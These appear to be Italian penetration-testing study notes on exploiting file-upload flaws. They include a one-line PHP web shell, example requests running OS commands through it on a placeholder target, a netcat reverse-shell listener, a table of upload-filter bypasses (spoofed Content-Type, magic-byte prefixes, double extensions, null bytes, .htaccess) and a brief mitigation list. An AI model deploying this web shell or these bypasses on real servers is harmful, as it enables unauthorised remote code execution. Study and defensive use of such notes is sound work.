L'app permette di caricare file e poi li serve/esegue. Se carichi uno script lato server in una cartella eseguibile ottieni RCE.

```
	<?php system($_GET['cmd']) ?>
```
carichi poi:
```
	http://TARGET/uploads/shell.php?cmd=id
	http://TARGET/uploads/shell.php?cmd=whoami
```
- system esegue un comando OS

## Reverse shell

```
	nc -nvlp 4444
	-l: listen
	-v: verbose
	-n: no DNS
	-p: port
```

## Tecniche di bypass dei filtri


| Filtro                    | Bypass                                                               |
| ------------------------- | -------------------------------------------------------------------- |
| Blocco .php               | Estensioni alternative                                               |
| Controlla Content-Type    | In Burp cambi l'header in image/png mantenendo contenuto PHP         |
| Controlla i "magic bytes" | Prependi i magic bytes (GIF89a;) prima del codice PHP                |
| Doppia estensione         | shell.php.jpg / shell.jpg.php a seconda di come il server interpreta |
| Null byte (app vecchie)   | shell.php%00.jpg                                                     |
| .htaccess consentito      | Carichi un .htaccess che fa eseguire come PHP un'estensione innocua  |

### Mitigazione

Allowlist di estensioni, rinomina file random, valida il contenuto reale (non il Content-Type), salva fuori dalla webroot o in storage che non esegue codice, disabilita l'esecuzione nella cartella uploads, scansione AV.

---

Vedi anche: [[Command Injection]] · [[Path Traversal & LFI, RFI]] · [[Recon & Enumeration]]